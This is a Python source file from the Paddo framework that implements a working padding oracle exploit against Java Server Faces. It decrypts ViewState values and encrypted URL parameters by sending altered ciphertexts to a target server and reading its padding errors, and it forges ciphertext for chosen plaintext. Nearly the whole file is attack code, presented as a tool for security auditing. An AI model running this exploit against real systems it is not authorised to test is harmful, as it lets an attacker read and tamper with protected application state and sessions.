#
#   Paddo 
#
#   Created: 01/27/2011
#
#   Purpose: framework for auditing and conducting padding oracle attacks
#
#   Copyright (c) 2012 by Lucas Apa, IOActive, Inc.
#
#   This program is free software; you can redistribute it and/or modify
#   it under the terms of the GNU General Public License as published by
#   the Free Software Foundation; either version 3 of the License, or
#   (at your option) any later version.
#
#   This program is distributed in the hope that it will be useful,
#   but WITHOUT ANY WARRANTY; without even the implied warranty of
#   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#   GNU General Public License for more details.
#
#   You should have received a copy of the GNU General Public License
#   along with this program; if not, write to the Free Software
#   Foundation, Inc., 675 Mass Ave, Cambridge, MA 02139, USA.
# 

import exploit
import binascii, re, base64
import urllib2, urllib

class JsfExploit(exploit.Exploit):
    '''
    Exploits a Java Server Faces Padding Oracle
    @author: Lucas Apa ( lucasapa.sec@gmail.com )
    '''

    def __init__(self, auditObj):
        exploit.Exploit.__init__(self)
        self.auditObj = auditObj
        self._iv = []
        
        cookie_opener = urllib2.build_opener(self.auditObj._cookie_handler)
        urllib2.install_opener(cookie_opener)
        
        
    def exploit_param(self):
        self._plaintext = []
        self._intermediate = []
        target = self.auditObj._target
        cipher = self.auditObj._cipher
        block_size = self.auditObj._block_size
        encoding = self.auditObj._encoding
        
        
        cookie_opener = urllib2.build_opener(self.auditObj._cookie_handler)
        urllib2.install_opener(cookie_opener)
        
        
        self.decrypt_param(target, cipher, encoding, block_size)
        
        plaintxt = ''
        for x in self._plaintext:
            plaintxt += chr(int("0x"+x,16))
        print "[!] Plaintext: "+ plaintxt
    
    def exploit_viewstate(self):
        
        
        target = self.auditObj._target
        cipher = self.auditObj._cipher
        block_size = self.auditObj._block_size
        encoding = self.auditObj._encoding
        parameters = self.auditObj._parameters

        self.decrypt_viewstate(target, parameters, cipher, encoding, block_size)
        
        
    def decrypt_viewstate(self, target, parameters, cipher, encoding, block_size, block_offset = 8):
        plaintext = ["\x00"]*block_size
        intermediate_block = ["\x00"]*block_size
        decrypted = []
        blocks = []
        originalblocks = []

        originalcipher = cipher
        cipher = base64.b64decode(cipher)

        
        block_size = block_size * 2
        tmpblocks = [x for x in re.split('(\w{'+str(block_size)+'})', cipher.encode("hex")) if x] 

        for block in tmpblocks:
            blocks.append([x.decode("hex") for x in re.split('(\w{2})', block) if x])
            originalblocks.append([x.decode("hex") for x in re.split('(\w{2})', block) if x])
        
        
        blocks.append(blocks[0])
        iv_offset = len(blocks)*(block_size/2)-(len(blocks)*(block_size/2)-(block_offset)/(block_size/2)-1)

        blocks[len(blocks)-iv_offset] = ["\x00"]*(block_size/2)
        

        print "[+] Decrypting block #: "+str(iv_offset)
        
        iv = blocks[iv_offset-1]

        #We save our original IV
        if not self._iv:
            self._iv = iv

        print "[+] IV: "+"".join(iv).encode("hex")
        
        for cipher_byte in xrange(len(iv)):

            intermediate_found = False
            
            for byte in xrange(cipher_byte):
                intermediate_value = intermediate_block[len(iv)-(cipher_byte)+byte]
                xored_int = int("0x"+intermediate_value.encode("hex"),16)^(cipher_byte+1)
                xored_intermediate = chr(xored_int)
                blocks[len(blocks)-iv_offset][len(iv)-(cipher_byte+1)+byte+1] = xored_intermediate
                
            
            for x in xrange(256):
                
                tmp = chr(x)
                blocks[len(blocks)-iv_offset][len(iv)-(cipher_byte+1)] = tmp
                
                tmp_cipher = ""

                for x in blocks:
                    tmp_cipher += "".join(x)

                tmp_cipher =  urllib.unquote(base64.b64encode(tmp_cipher))
                parameters["javax.faces.ViewState"] = tmp_cipher
                #print tmp_cipher
                #print tmp_cipher
                try:
                    data = urllib.urlencode(parameters)
                    print data
                    req = urllib2.Request(target, data)
                    res = urllib2.urlopen(req).read()
                    print res
                except urllib2.HTTPError, e:
                    if e.code == 500:
                        res = "error"  
   
                errors = ["BadPaddingException", "error"]
                error_clean = True
                for error in errors:
                    if error in res:
                        error_clean = False
                        
                if error_clean:
                    #print res
                    print "[!] Valid Padding: " + "".join(iv).encode("hex")
                    padding_value = cipher_byte+1
                    current_value = blocks[len(blocks)-iv_offset][len(iv)-(cipher_byte+1)]
                    
                    xored_int = int("0x"+current_value.encode("hex"),16)^padding_value
                    xored_intermediate = chr(xored_int)
                    intermediate_block[len(iv)-(cipher_byte)-1] = xored_intermediate
                    intermediate_found = True

                    break
                    
                else:
                    print "[!] Invalid Padding: " + "".join(iv).encode("hex")
                    pass
                
            if not intermediate_found:
                "NO ENCONTRO PADDING VALIDO !" 

                    
        for x in xrange(len(iv)):
            print originalblocks
            print iv_offset
            print x
            byte_decrypt = int("0x"+originalblocks[iv_offset][x].encode("hex"),16)^int("0x"+intermediate_block[x].encode("hex"),16)
            if byte_decrypt <= 128:
                decrypted.append(chr(byte_decrypt))
            else:
                decrypted.append(".")
        print "[!] Intermediate bytes: "+ "".join(intermediate_block).encode("hex")
        print "[*] Block decrypted: "+ "".join(decrypted)
        
        
        
        #We decrypt the next block
        next_offset = block_offset+(block_size/2)
        if next_offset*2 < len(blocks)*(block_size/2):
            self.decrypt_viewstate(target, parameters, originalcipher, encoding, block_size/2, next_offset)
  
        #Finally our plaintext decrypted
        
        for x in xrange(len(iv)):
            plaintext.append((chr(int("0x"+self._iv[x].encode("hex"),16)^int("0x"+intermediate_block[x].encode("hex"),16))).encode("hex"))
        print "[*] Plaintext: "+ "".join(plaintext)
       
    
    
    
           
    def decrypt_param(self, target, cipher, encoding, block_size, block_offset = 8, encrypt=False):
        plaintext = ["\x00"]*block_size
        intermediate_block = ["\x00"]*block_size
        newblock = [["\x00"]*block_size]
        decrypted = []
        blocks = []

        
        block_size = block_size * 2
        originalcipher = cipher
        cipher = base64.b64decode(urllib.unquote(cipher))
        tmpblocks = [x for x in re.split('(\w{'+str(block_size)+'})', cipher.encode("hex")) if x] 

        for block in tmpblocks:
            blocks.append([x.decode("hex") for x in re.split('(\w{2})', block) if x])
        
        iv_offset = len(blocks)*(block_size/2)-(len(blocks)*(block_size/2)-(block_offset)/(block_size/2)-1)
        print
        print "[+] Decrypting block #: "+str(iv_offset)
        iv = blocks[iv_offset-1]
        newblock.insert(1,iv)

        #We save our original IV
        if not self._iv:
            self._iv = iv

        print "[+] Original Block: "+"".join(iv).encode("hex")
        print "[+] IV: "+"".join(blocks[iv_offset-2]).encode("hex")
        print "[+] Padding !"
        tmptarget = target.replace(cipher, "[CIPHERTXT]")

        
        for cipher_byte in xrange(len(iv)):

            for byte in xrange(cipher_byte):
                intermediate_value = intermediate_block[len(iv)-(cipher_byte)+byte]
                xored_int = int("0x"+intermediate_value.encode("hex"),16)^(cipher_byte+1)
                xored_intermediate = chr(xored_int)
                newblock[0][len(iv)-(cipher_byte+1)+byte+1] = xored_intermediate
           
            for x in xrange(256):
                
                
                #We just try the default value first !
                if x != 0:
                    tmp = chr(x)
                    newblock[0][len(iv)-(cipher_byte+1)] = tmp                    
                
                             
                tmp_cipher = ""  
                for x in newblock:
                    tmp_cipher += "".join(x) 

                tmp_cipher = urllib.quote(base64.b64encode(tmp_cipher))

                tmptarget = target.replace("[CIPHERTXT]", tmp_cipher)
                req = urllib2.Request(tmptarget)
                req.add_header('User-agent', 'Mozilla/5.0')
                response = urllib2.urlopen(req)
                res = response.read()

                tmptarget = target.replace(tmp_cipher, "[CIPHERTXT]")
                
                
                errors = ["BadPaddingException", "error" ]
                error_clean = True
                for error in errors:
                    if error in res:
                        error_clean = False
               

                if "image/jpeg" in response.headers or error_clean:
                    print "[!] Valid Padding: " + "".join(newblock[0]).encode("hex") +" "+"".join(newblock[1]).encode("hex")
                    
                    padding_value = cipher_byte+1
                    current_value = newblock[0][len(iv)-(cipher_byte+1)]
                    
                    xored_int = int("0x"+current_value.encode("hex"),16)^padding_value
                    xored_intermediate = chr(xored_int)

                    intermediate_block[len(iv)-(cipher_byte)-1] = xored_intermediate

                    print "[!] Intermediate Block: " + "".join(intermediate_block).encode("hex")
                    
                    
                    break
                else:
                    print "[!] Invalid Padding: " + "".join(newblock[0]).encode("hex")
                    pass
        self._intermediate.append(intermediate_block)
        for x in xrange(len(iv)):
            decrypted.append((chr(int("0x"+blocks[iv_offset-2][x].encode("hex"),16)^int("0x"+intermediate_block[x].encode("hex"),16))).encode("hex"))
        print "[*] Block decrypted: "+ "".join(decrypted)
        

        #We save our partial plaintext
        
        for x in decrypted:
            self._plaintext.append(x)        
        
        #We decrypt the next block
        next_offset = block_offset+(block_size/2)
        if next_offset*2 <= (len(blocks)*(block_size/2))+(block_size/2) and not encrypt:
            self.decrypt_param(target, originalcipher, encoding, block_size/2, next_offset)
        
        if encrypt:
            return intermediate_block
  
        
        
    def encrypt_param(self, encrypt ):
        print "[*] Encrypting: " + encrypt
        self._plaintext = []
        self._intermediate = []
        target = self.auditObj._target
        cipher = self.auditObj._cipher
        block_size = self.auditObj._block_size
        encoding = self.auditObj._encoding
        
        
        cookie_opener = urllib2.build_opener(self.auditObj._cookie_handler)
        urllib2.install_opener(cookie_opener)
            
            
        encrypt_list = [x for x in re.split('(\w{2})', encrypt.encode("hex")) if x]
        padd_value = ''
        for x in xrange(block_size):
            if not (len(encrypt_list)+x) % 8:
                if x == 0:
                    padd_value = 8
                else:
                    padd_value = x
        padd_string = '0'+str(padd_value)
        encrypt_list = encrypt_list+([padd_string]*padd_value)
        
        intermediates = ['']
        intermediates[0] = ["\x00"]*block_size
        position = len(encrypt_list)-block_size
        for x in xrange(len(cipher)/(block_size*2)):

            encode_intermediate = base64.encodestring("".join(["\x00"]*block_size+intermediates[x])) 
            
            intermediate = self.decrypt_param(target, encode_intermediate, encoding, block_size, block_offset = 8, encrypt=True)
            
            for byte in xrange(len(intermediate)):
                intermediate[byte] = chr(int("0x"+encrypt_list[position+byte],16)^int("0x"+intermediate[byte].encode("hex"),16))
            position = position-block_size
            intermediates.append(intermediate)
        
        zeros = intermediates[0]
        intermediates = intermediates[1:]
        intermediates.reverse()
        intermediates.append(zeros)
        tmp = []
        for inter in intermediates:
            tmp += inter
        intermediates = tmp

        #intermediates = ['6d','bc','c5','ba','b6','16','3f','d0','68','1d','d4','4e','d4','cc','44','94']
        ciphertxt = ''
       
        for x in xrange(len(intermediates)):
            ciphertxt += chr(int("0x"+intermediates[x].encode("hex"),16))
            
        print "[!] Ciphertext: " + urllib.quote(base64.encodestring(ciphertxt).replace("\n",""))

        
